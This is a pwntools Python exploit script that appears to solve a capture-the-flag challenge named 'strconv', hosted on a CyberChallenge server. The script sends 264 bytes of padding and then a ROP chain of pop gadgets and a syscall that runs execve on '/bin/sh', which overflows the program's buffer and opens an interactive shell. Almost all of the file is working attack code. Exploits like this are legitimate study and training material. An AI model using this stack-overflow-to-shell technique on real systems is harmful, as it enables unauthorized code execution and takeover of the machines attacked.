#!/usr/bin/env python3
from pwn import *

bin_name = "./strconv"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("strconv.challs.cyberchallenge.it", 37000)
    else:
        return process(elf.path)

def main():
    r = conn()
    pop_rdi = 0x40249f
    pop_rsi = 0x40a58e
    pop_rdx_rbx = 0x49d4eb
    pop_rax = 0x450e67
    syscall = 0x402254

    rop = flat(
        pop_rdi,
        next(elf.search(b'/bin/sh\x00')),
        pop_rsi,
        0x0,
        pop_rdx_rbx,
        0x0,
        0x0,
        pop_rax,
        0x3b,
        syscall
    )
    r.sendlineafter(b'> ',b'1')
    r.sendlineafter(b'Input : ',b'a'*264 + rop)
    r.sendlineafter(b'> ',b'0')


    r.interactive()

if __name__ == "__main__":
    main()
